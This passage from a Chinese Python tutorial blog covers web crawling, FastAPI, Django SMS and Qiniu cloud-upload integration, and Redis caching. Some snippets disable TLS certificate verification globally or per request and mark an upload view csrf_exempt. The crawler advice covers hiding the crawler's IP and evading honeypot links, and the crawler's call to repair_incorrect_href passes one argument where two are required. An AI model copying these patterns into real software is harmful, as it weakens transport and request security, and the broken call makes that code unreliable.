2.0时代开始，虽然Web上的数据很多都是由用户提供的，但是网站平台是投入了运营成本的，当用户在注册和发布内容时，平台通常就已经获得了对数据的所有权、使用权和分发权）。如果违反了这些规定，在打官司的时候败诉几率相当高。 Robots.txt文件大多数网站都会定义robots.txt文件，下面以淘宝的robots.txt文件为例，看看该网站对爬虫有哪些限制。 User-agent: Baiduspider Allow: /article Allow: /oshtml Disallow: /product/ Disallow: / User-Agent: Googlebot Allow: /article Allow: /oshtml Allow: /product Allow: /spu Allow: /dianpu Allow: /oversea Allow: /list Disallow: / User-agent: Bingbot Allow: /article Allow: /oshtml Allow: /product Allow: /spu Allow: /dianpu Allow: /oversea Allow: /list Disallow: / User-Agent: 360Spider Allow: /article Allow: /oshtml Disallow: / User-Agent: Yisouspider Allow: /article Allow: /oshtml Disallow: / User-Agent: Sogouspider Allow: /article Allow: /oshtml Allow: /product Disallow: / User-Agent: Yahoo! Slurp Allow: /product Allow: /spu Allow: /dianpu Allow: /oversea Allow: /list Disallow: / User-Agent: * Disallow: / 注意上面robots.txt第一段的最后一行，通过设置“Disallow: /”禁止百度爬虫访问除了“Allow”规定页面外的其他所有页面。因此当你在百度搜索“淘宝”的时候，搜索结果下方会出现：“由于该网站的robots.txt文件存在限制指令（限制搜索引擎抓取），系统无法提供该页面的内容描述”。百度作为一个搜索引擎，至少在表面上遵守了淘宝网的robots.txt协议，所以用户不能从百度上搜索到淘宝内部的产品信息。 相关工具介绍HTTP协议在开始讲解爬虫之前，我们稍微对HTTP（超文本传输协议）做一些回顾，因为我们在网页上看到的内容通常是浏览器执行HTML语言得到的结果，而HTTP就是传输HTML数据的协议。HTTP和其他很多应用级协议一样是构建在TCP（传输控制协议）之上的，它利用了TCP提供的可靠的传输服务实现了Web应用中的数据交换。按照维基百科上的介绍，设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法，也就是说这个协议是浏览器和Web服务器之间传输的数据的载体。关于这个协议的详细信息以及目前的发展状况，大家可以阅读阮一峰老师的《HTTP 协议入门》、《互联网协议入门》系列以及《图解HTTPS协议》进行了解，下图是我在四川省网络通信技术重点实验室工作期间用开源协议分析工具Ethereal（抓包工具WireShark的前身）截取的访问百度首页时的HTTP请求和响应的报文（协议数据），由于Ethereal截取的是经过网络适配器的数据，因此可以清晰的看到从物理链路层到应用层的协议数据。 HTTP请求（请求行+请求头+空行+[消息体]）： HTTP响应（响应行+响应头+空行+消息体）： 说明：但愿这两张如同泛黄照片般的截图帮助你大概的了解到HTTP是一个怎样的协议。 相关工具 Chrome Developer Tools：谷歌浏览器内置的开发者工具。 Postman：功能强大的网页调试与RESTful请求工具。 HTTPie：命令行HTTP客户端。 pip3 install httpie http --header http://www.scu.edu.cn HTTP/1.1 200 OK Accept-Ranges: bytes Cache-Control: private, max-age=600 Connection: Keep-Alive Content-Encoding: gzip Content-Language: zh-CN Content-Length: 14403 Content-Type: text/html Date: Sun, 27 May 2018 15:38:25 GMT ETag: \"e6ec-56d3032d70a32-gzip\" Expires: Sun, 27 May 2018 15:48:25 GMT Keep-Alive: timeout=5, max=100 Last-Modified: Sun, 27 May 2018 13:44:22 GMT Server: VWebServer Vary: User-Agent,Accept-Encoding X-Frame-Options: SAMEORIGIN builtwith库：识别网站所用技术的工具。 pip3 install builtwith &gt;&gt;&gt; import builtwith &gt;&gt;&gt; builtwith.parse('http://www.bootcss.com/') {'web-servers': ['Nginx'], 'font-scripts': ['Font Awesome'], 'javascript-frameworks': ['Lo-dash', 'Underscore.js', 'Vue.js', 'Zepto', 'jQuery'], 'web-frameworks': ['Twitter Bootstrap']} &gt;&gt;&gt; &gt;&gt;&gt; import ssl &gt;&gt;&gt; ssl._create_default_https_context = ssl._create_unverified_context &gt;&gt;&gt; builtwith.parse('https://www.jianshu.com/') {'web-servers': ['Tengine'], 'web-frameworks': ['Twitter Bootstrap', 'Ruby on Rails'], 'programming-languages': ['Ruby']} python-whois库：查询网站所有者的工具。 pip3 install python-whois &gt;&gt;&gt; import whois &gt;&gt;&gt; whois.whois('baidu.com') {'domain_name': ['BAIDU.COM', 'baidu.com'], 'registrar': 'MarkMonitor, Inc.', 'whois_server': 'whois.markmonitor.com', 'referral_url': None, 'updated_date': [datetime.datetime(2017, 7, 28, 2, 36, 28), datetime.datetime(2017, 7, 27, 19, 36, 28)], 'creation_date': [datetime.datetime(1999, 10, 11, 11, 5, 17), datetime.datetime(1999, 10, 11, 4, 5, 17)], 'expiration_date': [datetime.datetime(2026, 10, 11, 11, 5, 17), datetime.datetime(2026, 10, 11, 0, 0)], 'name_servers': ['DNS.BAIDU.COM', 'NS2.BAIDU.COM', 'NS3.BAIDU.COM', 'NS4.BAIDU.COM', 'NS7.BAIDU.COM', 'dns.baidu.com', 'ns4.baidu.com', 'ns3.baidu.com', 'ns7.baidu.com', 'ns2.baidu.com'], 'status': ['clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited', 'clientTransferProhibited https://icann.org/epp#clientTransferProhibited', 'clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited', 'serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited', 'serverTransferProhibited https://icann.org/epp#serverTransferProhibited', 'serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited', 'clientUpdateProhibited (https://www.icann.org/epp#clientUpdateProhibited)', 'clientTransferProhibited (https://www.icann.org/epp#clientTransferProhibited)', 'clientDeleteProhibited (https://www.icann.org/epp#clientDeleteProhibited)', 'serverUpdateProhibited (https://www.icann.org/epp#serverUpdateProhibited)', 'serverTransferProhibited (https://www.icann.org/epp#serverTransferProhibited)', 'serverDeleteProhibited (https://www.icann.org/epp#serverDeleteProhibited)'], 'emails': ['abusecomplaints@markmonitor.com', 'whoisrelay@markmonitor.com'], 'dnssec': 'unsigned', 'name': None, 'org': 'Beijing Baidu Netcom Science Technology Co., Ltd.', 'address': None, 'city': None, 'state': 'Beijing', 'zipcode': None, 'country': 'CN'} robotparser模块：解析robots.txt的工具。 &gt;&gt;&gt; from urllib import robotparser &gt;&gt;&gt; parser = robotparser.RobotFileParser() &gt;&gt;&gt; parser.set_url('https://www.taobao.com/robots.txt') &gt;&gt;&gt; parser.read() &gt;&gt;&gt; parser.can_fetch('Baiduspider', 'http://www.taobao.com/article') True &gt;&gt;&gt; parser.can_fetch('Baiduspider', 'http://www.taobao.com/product') False 一个简单的爬虫一个基本的爬虫通常分为数据采集（网页下载）、数据处理（网页解析）和数据存储（将有用的信息持久化）三个部分的内容，当然更为高级的爬虫在数据采集和处理时会使用并发编程或分布式技术，这就需要有调度器（安排线程或进程执行对应的任务）、后台管理程序（监控爬虫的工作状态以及检查数据抓取的结果）等的参与。 一般来说，爬虫的工作流程包括以下几个步骤： 设定抓取目标（种子页面/起始页面）并获取网页。 当服务器无法访问时，按照指定的重试次数尝试重新下载页面。 在需要的时候设置用户代理或隐藏真实IP，否则可能无法访问页面。 对获取的页面进行必要的解码操作然后抓取出需要的信息。 在获取的页面中通过某种方式（如正则表达式）抽取出页面中的链接信息。 对链接进行进一步的处理（获取页面并重复上面的动作）。 将有用的信息进行持久化以备后续的处理。 下面的例子给出了一个从“搜狐体育”上获取NBA新闻标题和链接的爬虫。 import re from collections import deque from urllib.parse import urljoin import requests LI_A_PATTERN = re.compile(r'&lt;li class=\"item\"&gt;.*?&lt;/li&gt;') A_TEXT_PATTERN = re.compile(r'&lt;a\\s+[^&gt;]*?&gt;(.*?)&lt;/a&gt;') A_HREF_PATTERN = re.compile(r'&lt;a\\s+[^&gt;]*?href=\"(.*?)\"\\s*[^&gt;]*?&gt;') def decode_page(page_bytes, charsets): \"\"\"通过指定的字符集对页面进行解码\"\"\" for charset in charsets: try: return page_bytes.decode(charset) except UnicodeDecodeError: pass def get_matched_parts(content_string, pattern): \"\"\"从字符串中提取所有跟正则表达式匹配的内容\"\"\" return pattern.findall(content_string, re.I) \\ if content_string else [] def get_matched_part(content_string, pattern, group_no=1): \"\"\"从字符串中提取跟正则表达式匹配的内容\"\"\" match = pattern.search(content_string) if match: return match.group(group_no) def get_page_html(seed_url, *, charsets=('utf-8', )): \"\"\"获取页面的HTML代码\"\"\" resp = requests.get(seed_url) if resp.status_code == 200: return decode_page(resp.content, charsets) def repair_incorrect_href(current_url, href): \"\"\"修正获取的href属性\"\"\" if href.startswith('//'): href = urljoin('http://', href) elif href.startswith('/'): href = urljoin(current_url, href) return href if href.startswith('http') else '' def start_crawl(seed_url, pattern, *, max_depth=-1): \"\"\"开始爬取数据\"\"\" new_urls, visited_urls = deque(), set() new_urls.append((seed_url, 0)) while new_urls: current_url, depth = new_urls.popleft() if depth != max_depth: page_html = get_page_html(current_url, charsets=('utf-8', 'gbk')) contents = get_matched_parts(page_html, pattern) for content in contents: text = get_matched_part(content, A_TEXT_PATTERN) href = get_matched_part(content, A_HREF_PATTERN) if href: href = repair_incorrect_href(href) print(text, href) if href and href not in visited_urls: new_urls.append((href, depth + 1)) def main(): \"\"\"主函数\"\"\" start_crawl( seed_url='http://sports.sohu.com/nba_a.shtml', pattern=LI_A_PATTERN, max_depth=2 ) if __name__ == '__main__': main() 爬虫注意事项通过上面的例子，我们对爬虫已经有了一个感性的认识，在编写爬虫时有以下一些注意事项： 上面的代码使用了requests三方库来获取网络资源，这是一个非常优质的三方库，关于它的用法可以参考它的官方文档。 上面的代码中使用了双端队列（deque）来保存待爬取的URL。双端队列相当于是使用链式存储结构的list，在双端队列的头尾添加和删除元素性能都比较好，刚好可以用来构造一个FIFO（先进先出）的队列结构。 处理相对路径。有的时候我们从页面中获取的链接不是一个完整的绝对链接而是一个相对链接，这种情况下需要将其与URL前缀进行拼接（urllib.parse中的urljoin()函数可以完成此项操作）。 设置代理服务。有些网站会限制访问的区域（例如美国的Netflix屏蔽了很多国家的访问），有些爬虫需要隐藏自己的身份，在这种情况下可以设置使用代理服务器，代理服务器有免费的服务器和付费的商业服务器，但后者稳定性和可用性都更好，强烈建议在商业项目中使用付费的商业代理服务器。如果使用requests三方库，可以在请求方法中添加proxies参数来指定代理服务器；如果使用标准库，可以通过修改urllib.request中的ProxyHandler来为请求设置代理服务器。 限制下载速度。如果我们的爬虫获取网页的速度过快，可能就会面临被封禁或者产生“损害动产”的风险（这个可能会导致吃官司且败诉），可以在两次获取页面数据之间添加延时从而对爬虫进行限速。 避免爬虫陷阱。有些网站会动态生成页面内容，这会导致产生无限多的页面（例如在线万年历通常会有无穷无尽的链接）。可以通过记录到达当前页面经过了多少个链接（链接深度）来解决该问题，当达到事先设定的最大深度时，爬虫就不再像队列中添加该网页中的链接了。 避开蜜罐链接。网站上的有些链接是浏览器中不可见的，这种链接通常是故意诱使爬虫去访问的蜜罐，一旦访问了这些链接，服务器就会判定请求是来自于爬虫的，这样可能会导致被服务器封禁IP地址。如何避开这些蜜罐链接我们在后面为大家进行讲解。 SSL相关问题。如果使用标准库的urlopen打开一个HTTPS链接时会验证一次SSL证书，如果不做出处理会产生错误提示“SSL: CERTIFICATE_VERIFY_FAILED”，可以通过以下两种方式加以解决： 使用未经验证的上下文 import ssl request = urllib.request.Request(url='...', headers={...}) context = ssl._create_unverified_context() web_page = urllib.request.urlopen(request, context=context) 设置全局性取消证书验证 import ssl ssl._create_default_https_context = ssl._create_unverified_context","categories":[],"tags":[{"name":"网络爬虫","slug":"网络爬虫","permalink":"http://www.xiaocaibi.top/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"}]},{"title":"56-60.用FastAPI开发数据接口","slug":"56-60-用FastAPI开发数据接口","date":"2021-06-27T02:37:50.000Z","updated":"2021-09-20T08:47:43.728Z","comments":true,"path":"posts/8453bc70.html","link":"","permalink":"http://www.xiaocaibi.top/posts/8453bc70.html","excerpt":"","text":"用FastAPI开发网络数据接口FastAPI 是一个用于构建API（网络数据接口）的现代、高性能的Web框架，基于Python 3.6+，使用了Python中的类型提示进行类型检查，非常符合工程化开发的需求，在业界有非常好的口碑。下面，我们先用代码告诉大家FastAPI到底能做什么，然后再来讲解它的方方面面。 FastAPI五分钟上手 安装依赖库和ASGI服务器（支持异步I/O的Python服务器）。 pip install fastapi pip install uvicorn 编写代码main.py。 from fastapi import FastAPI app = FastAPI() @app.get('/') def say_hello(): return {'code': 200, 'message': 'hello, world!'} 运行服务。 uvicorn main:app --reload 说明：上面运行uvicorn时使用的--reload参数会在代码发生变更时自动重新加载新的内容，这个参数在开发阶段非常的有用。 访问服务。 查看文档。 注意：FastAPI会基于Swagger UI自动为数据接口生成对应的文档。 请求和响应接入关系型数据库我们可以使用SQLAlchemy三方库来实现对关系型数据库的接入。SQLAlchemy是一个ORM（对象关系映射）框架，ORM框架可以解决Python程序的面向对象模型和关系型数据库的关系模型并不匹配的问题，使得我们可以用面向对象的方式实现数据的CRUD操作。 依赖注入中间件异步化虚拟化部署（Docker）项目实战：车辆违章查询","categories":[],"tags":[{"name":"FastAPI","slug":"FastAPI","permalink":"http://www.xiaocaibi.top/tags/FastAPI/"}]},{"title":"55.项目上线","slug":"55-项目上线","date":"2021-06-24T09:38:23.000Z","updated":"2021-09-20T08:47:43.728Z","comments":true,"path":"posts/24c40381.html","link":"","permalink":"http://www.xiaocaibi.top/posts/24c40381.html","excerpt":"","text":"项目上线请各位读者移步到《项目部署上线和性能调优》一文。","categories":[],"tags":[{"name":"项目上线","slug":"项目上线","permalink":"http://www.xiaocaibi.top/tags/%E9%A1%B9%E7%9B%AE%E4%B8%8A%E7%BA%BF/"}]},{"title":"54.单元测试","slug":"54-单元测试","date":"2021-06-22T02:28:02.000Z","updated":"2021-09-20T08:47:43.712Z","comments":true,"path":"posts/663d68db.html","link":"","permalink":"http://www.xiaocaibi.top/posts/663d68db.html","excerpt":"","text":"单元测试Python标准库中提供了名为unittest 的模块来支持我们对代码进行单元测试。所谓单元测试是指针对程序中最小的功能单元（在Python中指函数或类中的方法）进行的测试。","categories":[],"tags":[{"name":"单元测试","slug":"单元测试","permalink":"http://www.xiaocaibi.top/tags/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"}]},{"title":"53.异步任务和定时任务","slug":"53-异步任务和定时任务","date":"2021-06-20T06:40:44.000Z","updated":"2021-09-20T08:47:43.712Z","comments":true,"path":"posts/5779d05c.html","link":"","permalink":"http://www.xiaocaibi.top/posts/5779d05c.html","excerpt":"","text":"异步任务和定时任务在Web应用中，如果一个请求执行了耗时间的操作或者该请求的执行时间无法确定，而且对于用户来说只需要知道服务器接收了他的请求，并不需要马上得到请求的执行结果，这样的操作我们就应该对其进行异步化处理。如果说使用缓存是优化网站性能的第一要义，那么将耗时间或执行时间不确定的任务异步化则是网站性能优化的第二要义，简单的说就是能推迟做的事情都不要马上做。 上一章节中讲到的发短信和上传文件到云存储为例，这两个操作前者属于时间不确定的操作（因为作为调用者，我们不能确定三方平台响应的时间），后者属于耗时间的操作（如果文件较大或者三方平台不稳定，都可能导致上传的时间较长），很显然，这两个操作都可以做异步化处理。 在Python项目中实现异步化处理可以使用多线程或借助三方库Celery来完成。 使用Celery实现异步化使用多线程实现异步化","categories":[],"tags":[{"name":"异步任务和定时任务","slug":"异步任务和定时任务","permalink":"http://www.xiaocaibi.top/tags/%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"}]},{"title":"52.接入三方平台","slug":"52-接入三方平台","date":"2021-06-18T14:02:29.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/413cb3f.html","link":"","permalink":"http://www.xiaocaibi.top/posts/413cb3f.html","excerpt":"","text":"接入三方平台在Web应用的开发过程中，有一些任务并不是我们自己能够完成的。例如，我们的Web项目中需要做个人或企业的实名认证，很显然我们并没有能力判断用户提供的认证信息的真实性，这个时候我们就要借助三方平台提供的服务来完成该项操作。再比如说，我们的项目中需要提供在线支付功能，这类业务通常也是借助支付网关来完成而不是自己去实现，我们只需要接入像微信、支付宝、银联这样的三方平台即可。 在项目中接入三方平台基本上就两种方式：API接入和SDK接入。 API接入指的是通过访问三方提供的URL来完成操作或获取数据。国内有很多这样的平台提供了大量常用的服务，例如聚合数据上提供了生活服务类、金融科技类、交通地理类、充值缴费类等各种类型的API。我们可以通过Python程序发起网络请求，通过访问URL获取数据，这些API接口跟我们项目中提供的数据接口是一样的，只不过我们项目中的API是供自己使用的，而这类三方平台提供的API是开放的。当然开放并不代表免费，大多数能够提供有商业价值的数据的API都是需要付费才能使用的。 SDK接入指的是通过安装三方库并使用三方库封装的类、函数来使用三方平台提供的服务的方式。例如我们刚才说到的接入支付宝，就需要先安装支付宝的SDK，然后通过支付宝封装的类和方法完成对支付服务的调用。 下面我们通过具体的例子来讲解如何接入三方平台。 接入短信网关一个Web项目有很多地方都可以用到短信服务，例如：手机验证码登录、重要消息提醒、产品营销短信等。要实现发送短信的功能，可以通过接入短信网关来实现，国内比较有名的短信网关包括：云片短信、网易云信、螺丝帽、SendCloud等，这些短信网关一般都提供了免费试用功能。下面我们以螺丝帽平台为例，讲解如何在项目中接入短信网关，其他平台操作基本类似。 注册账号，新用户可以免费试用。 登录到管理后台，进入短信版块。 点击“触发发送”可以找到自己专属的API Key（身份标识）。 点击“签名管理”可以添加短信签名，短信都必须携带签名，免费试用的短信要在短信中添加“【铁壳测试】”这个签名，否则短信无法发送。 点击“IP白名单”将运行Django项目的服务器地址（公网IP地址，本地运行可以打开xxx网站查看自己本机的公网IP地址）填写到白名单中，否则短信无法发送。 如果没有剩余的短信条数，可以到“充值”页面选择“短信服务”进行充值。 接下来，我们可以通过调用螺丝帽短信网关实现发送短信验证码的功能，代码如下所示。 def send_mobile_code(tel, code): \"\"\"发送短信验证码\"\"\" resp = requests.post( url='http://sms-api.luosimao.com/v1/send.json', auth=('api', 'key-自己的APIKey'), data={ 'mobile': tel, 'message': f'您的短信验证码是{code}，打死也不能告诉别人哟。【Python小课】' }, verify=False ) return resp.json() 运行上面的代码需要先安装requests三方库，这个三方库封装了HTTP网络请求的相关功能，使用起来非常的简单，我们在之前的内容中也讲到过这个三方库。send_mobile_code函数有两个参数，第一个参数是手机号，第二个参数是短信验证码的内容，第5行代码需要提供自己的API Key，就是上面第2步中查看到的自己的API Key。请求螺丝帽的短信网关会返回JSON格式的数据，对于上面的代码如果返回{'err': 0, 'msg': 'ok'}，则表示短信发送成功，如果err字段的值不为0而是其他值，则表示短信发送失败，可以在螺丝帽官方的开发文档页面上查看到不同的数值代表的含义，例如：-20表示余额不足，-32表示缺少短信签名。 可以在视图函数中调用上面的函数来完成发送短信验证码的功能，稍后我们可以把这个功能跟用户注册结合起来。 生成随机验证码和验证手机号的函数。 import random import re TEL_PATTERN = re.compile(r'1[3-9]\\d{9}') def check_tel(tel): \"\"\"检查手机号\"\"\" return TEL_PATTERN.fullmatch(tel) is not None def random_code(length=6): \"\"\"生成随机短信验证码\"\"\" return ''.join(random.choices('0123456789', k=length)) 发送短信验证码的视图函数。 @api_view(('GET', )) def get_mobilecode(request, tel): \"\"\"获取短信验证码\"\"\" if check_tel(tel): redis_cli = get_redis_connection() if redis_cli.exists(f'vote:block-mobile:{tel}'): data = {'code': 30001, 'message': '请不要在60秒内重复发送短信验证码'} else: code = random_code() send_mobile_code(tel, code) # 通过Redis阻止60秒内容重复发送短信验证码 redis_cli.set(f'vote:block-mobile:{tel}', 'x', ex=60) # 将验证码在Redis中保留10分钟（有效期10分钟） redis_cli.set(f'vote2:valid-mobile:{tel}', code, ex=600) data = {'code': 30000, 'message': '短信验证码已发送，请注意查收'} else: data = {'code': 30002, 'message': '请输入有效的手机号'} return Response(data) 说明：上面的代码利用Redis实现了两个额外的功能，一个是阻止用户60秒内重复发送短信验证码，一个是将用户的短信验证码保留10分钟，也就是说这个短信验证码的有效期只有10分钟，我们可以要求用户在注册时提供该验证码来验证用户手机号的真实性。 接入云存储服务当我们提到云存储这个词的时候，通常是指把数据存放在由第三方提供的虚拟服务器环境下，简单的说就是将某些数据或资源通过第三平台托管。一般情况下，提供云存储服务的公司都运营着大型的数据中心，需要云存储服务的个人或组织通过向其购买或租赁存储空间来满足数据存储的需求。在开发Web应用时，可以将静态资源，尤其是用户上传的静态资源直接置于云存储服务中，云存储通常会提供对应的URL使得用户可以访问该静态资源。国内外比较有名的云存储服务（如：亚马逊的S3、阿里的OSS2等）一般都物美价廉，相比自己架设静态资源服务器，云存储的代价更小，而且一般的云存储平台都提供了CDN服务，用于加速对静态资源的访问，所以不管从哪个角度出发，使用云存储的方式管理Web应用的数据和静态资源都是非常好的选择，除非这些资源涉及到个人或商业隐私，否则就可以托管到云存储中。 下面我们以接入七牛云为例，讲解如何实现将用户上传的文件保存到七牛云存储。七牛云是国内知名的云计算及数据服务提供商，七牛云在海量文件存储、CDN、视频点播、互动直播以及大规模异构数据的智能分析与处理等领域都有自己的产品，而且非付费用户也可以免费接入，使用其提供的服务。下面是接入七牛云的流程： 注册账号，登录管理控制台。 选择左侧菜单中的对象存储。 在空间管理中选择新建空间（例如：myvote），如果提示空间名称已被占用，更换一个再尝试即可。注意，创建空间后会提示绑定自定义域名，如果暂时还没有自己的域名，可以使用七牛云提供的临时域名，但是临时域名会在30天后被回收，所以最好准备自己的域名（域名需要备案，不清楚如何操作的请自行查阅相关资料）。 在网页的右上角点击个人头像中的“密钥管理”，查看自己的密钥，稍后在代码中需要使用AK（AccessKey）和SK（SecretKey）两个密钥来认证用户身份。 点击网页上方菜单中的“文档”，进入到七牛开发者中心，选择导航菜单中的“SDK&amp;工具”并点击“官方SDK”子菜单，找到Python（服务端）并点击“文档”查看官方文档。 接下来，只要安装官方文档提供的示例，就可以接入七牛云，使用七牛云提供的云存储以及其他服务。首先可以通过下面的命令安装七牛云的三方库。 pip install qiniu 接下来可以通过qiniu模块中的put_file和put_stream两个函数实现文件上传，前者可以上传指定路径的文件，后者可以将内存中的二进制数据上传至七牛云，具体的代码如下所示。 import qiniu AUTH = qiniu.Auth('密钥管理中的AccessKey', '密钥管理中的SecretKey') BUCKET_NAME = 'myvote' def upload_file_to_qiniu(key, file_path): \"\"\"上传指定路径的文件到七牛云\"\"\" token = AUTH.upload_token(BUCKET_NAME, key) return qiniu.put_file(token, key, file_path) def upload_stream_to_qiniu(key, stream, size): \"\"\"上传二进制数据流到七牛云\"\"\" token = AUTH.upload_token(BUCKET_NAME, key) return qiniu.put_stream(token, key, stream, None, size) 下面是一个文件上传的简单前端页。 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;上传文件&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=\"/upload/\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;div&gt; &lt;input type=\"file\" name=\"photo\"&gt; &lt;input type=\"submit\" value=\"上传\"&gt; &lt;/div&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 说明：前端如果使用表单实现文件上传，表单的method属性必须设置为post，enctype属性需要设置为multipart/form-data，表单中type属性为file的input标签，就是上传文件的文件选择器。 实现上传功能的视图函数如下所示。 from django.views.decorators.csrf import csrf_exempt @csrf_exempt def upload(request): # 如果上传的文件小于2.5M，则photo对象的类型为InMemoryUploadedFile，文件在内存中 # 如果上传的文件超过2.5M，则photo对象的类型为TemporaryUploadedFile，文件在临时路径下 photo = request.FILES.get('photo') _, ext = os.path.splitext(photo.name) # 通过UUID和原来文件的扩展名生成独一无二的新的文件名 filename = f'{uuid.uuid1().hex}{ext}' # 对于内存中的文件，可以使用上面封装好的函数upload_stream_to_qiniu上传文件到七牛云 # 如果文件保存在临时路径下，可以使用upload_file_to_qiniu实现文件上传 upload_stream_to_qiniu(filename, photo.file, photo.size) return redirect('/static/html/upload.html') 注意：上面的视图函数使用了csrf_exempt装饰器，该装饰器能够让表单免除必须提供CSRF令牌的要求。此外，代码第11行使用了uuid模块的uuid1函数来生成全局唯一标识符。 运行项目尝试文件上传的功能，文件上传成功后，可以在七牛云“空间管理”中点击自己空间并进入“文件管理”界面，在这里可以看到我们刚才上传成功的文件，而且可以通过七牛云提供的域名获取该文件。","categories":[],"tags":[{"name":"接入三方平台","slug":"接入三方平台","permalink":"http://www.xiaocaibi.top/tags/%E6%8E%A5%E5%85%A5%E4%B8%89%E6%96%B9%E5%B9%B3%E5%8F%B0/"}]},{"title":"51.使用缓存","slug":"51-使用缓存","date":"2021-06-16T10:10:30.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/4dcda541.html","link":"","permalink":"http://www.xiaocaibi.top/posts/4dcda541.html","excerpt":"","text":"使用缓存通常情况下，Web应用的性能瓶颈都会出现在关系型数据库上，当并发访问量较大时，如果所有的请求都需要通过关系型数据库完成数据持久化操作，那么数据库一定会不堪重负。优化Web应用性能最为重要的一点就是使用缓存，把那些数据体量不大但访问频率非常高的数据提前加载到缓存服务器中，这又是典型的空间换时间的方法。通常缓存服务器都是直接将数据置于内存中而且使用了非常高效的数据存取策略（哈希存储、键值对方式等），在读写性能上远远优于关系型数据库的，因此我们可以让Web应用接入缓存服务器来优化其性能，其中一个非常好的选择就是使用Redis。 Web应用的缓存架构大致如下图所示。 Django项目接入Redis在此前的课程中，我们介绍过Redis的安装和使用，此处不再进行赘述。如果需要在Django项目中接入Redis，可以使用三方库django-redis，这个三方库又依赖了一个名为redis 的三方库，它封装了对Redis的各种操作。 安装django-redis。 pip install django-redis 修改Django配置文件中关于缓存的配置。 CACHES = { 'default': { # 指定通过django-redis接入Redis服务 'BACKEND': 'django_redis.cache.RedisCache', # Redis服务器的URL 'LOCATION': ['redis://1.2.3.4:6379/0', ], # Redis中键的前缀（解决命名冲突） 'KEY_PREFIX': 'vote', # 其他的配置选项 'OPTIONS': { 'CLIENT_CLASS': 'django_redis.client.DefaultClient', # 连接池（预置若干备用的Redis连接）参数 'CONNECTION_POOL_KWARGS': { # 最大连接数 'max_connections': 512, }, # 连接Redis的用户口令 'PASSWORD': 'foobared', } }, } 至此，我们的Django项目已经可以接入Redis，接下来我们修改项目代码，用Redis为之写的获取学科数据的接口提供缓存服务。 为视图提供缓存服务声明式缓存所谓声明式缓存是指不修改原来的代码，通过Python中的装饰器（代理）为原有的代码增加缓存功能。对于FBV，代码如下所示。 from django.views.decorators.cache import cache_page @api_view(('GET', )) @cache_page(timeout=86400, cache='default') def show_subjects(request): \"\"\"获取学科数据\"\"\" queryset = Subject.objects.all() data = SubjectSerializer(queryset, many=True).data return Response({'code': 20000, 'subjects': data}) 上面的代码通过Django封装的cache_page装饰器缓存了视图函数的返回值（响应对象），cache_page的本意是缓存视图函数渲染的页面，对于返回JSON数据的视图函数，相当于是缓存了JSON数据。在使用cache_page装饰器时，可以传入timeout参数来指定缓存过期时间，还可以使用cache参数来指定需要使用哪一组缓存服务来缓存数据。Django项目允许在配置文件中配置多组缓存服务，上面的cache='default'指定了使用默认的缓存服务（因为之前的配置文件中我们也只配置了名为default的缓存服务）。视图函数的返回值会被序列化成字节串放到Redis中（Redis中的str类型可以接收字节串），缓存数据的序列化和反序列化也不需要我们自己处理，因为cache_page装饰器会调用django-redis库中的RedisCache来对接Redis，该类使用了DefaultClient来连接Redis并使用了pickle序列化，django_redis.serializers.pickle.PickleSerializer是默认的序列化类。 如果缓存中没有学科的数据，那么通过接口访问学科数据时，我们的视图函数会通过执行Subject.objects.all()向数据库发出SQL语句来获得数据，视图函数的返回值会被缓存，因此下次请求该视图函数如果缓存没有过期，可以直接从缓存中获取视图函数的返回值，无需再次查询数据库。如果想了解缓存的使用情况，可以配置数据库日志或者使用Django-Debug-Toolbar来查看，第一次访问学科数据接口时会看到查询学科数据的SQL语句，再次获取学科数据时，不会再向数据库发出SQL语句，因为可以直接从缓存中获取数据。 对于CBV，可以利用Django中名为method_decorator的装饰器将cache_page这个装饰函数的装饰器放到类中的方法上，效果跟上面的代码是一样的。需要提醒大家注意的是，cache_page装饰器不能直接放在类上，因为它是装饰函数的装饰器，所以Django框架才提供了method_decorator来解决这个问题，很显然，method_decorator是一个装饰类的装饰器。 from django.utils.decorators import method_decorator from django.views.decorators.cache import cache_page @method_decorator(decorator=cache_page(timeout=86400, cache='default'), name='get') class SubjectView(ListAPIView): \"\"\"获取学科数据的视图类\"\"\" queryset = Subject.objects.all() serializer_class = SubjectSerializer 编程式缓存所谓编程式缓存是指通过自己编写的代码来使用缓存服务，这种方式虽然代码量会稍微大一些，但是相较于声明式缓存，它对缓存的操作和使用更加灵活，在实际开发中使用得更多。下面的代码去掉了之前使用的cache_page装饰器，通过django-redis提供的get_redis_connection函数直接获取Redis连接来操作Redis。 def show_subjects(request): \"\"\"获取学科数据\"\"\" redis_cli = get_redis_connection() # 先尝试从缓存中获取学科数据 data = redis_cli.get('vote:polls:subjects') if data: # 如果获取到学科数据就进行反序列化操作 data = json.loads(data) else: # 如果缓存中没有获取到学科数据就查询数据库 queryset = Subject.objects.all() data = SubjectSerializer(queryset, many=True).data # 将查到的学科数据序列化后放到缓存中 redis_cli.set('vote:polls:subjects', json.dumps(data), ex=86400) return Response({'code': 20000, 'subjects': data}) 需要说明的是，Django框架提供了cache和caches两个现成的变量来支持缓存操作，前者访问的是默认的缓存（名为default的缓存），后者可以通过索引运算获取指定的缓存服务（例如：caches['default']）。向cache对象发送get和set消息就可以实现对缓存的读和写操作，但是这种方式能做的操作有限，不如上面代码中使用的方式灵活。还有一个值得注意的地方，由于可以通过get_redis_connection函数获得的Redis连接对象向Redis发起各种操作，包括FLUSHDB、SHUTDOWN等危险的操作，所以在实际商业项目开发中，一般都会对django-redis再做一次封装，例如封装一个工具类，其中只提供了项目需要用到的缓存操作的方法，从而避免了直接使用get_redis_connection的潜在风险。当然，自己封装对缓存的操作还可以使用“Read Through”和“Write 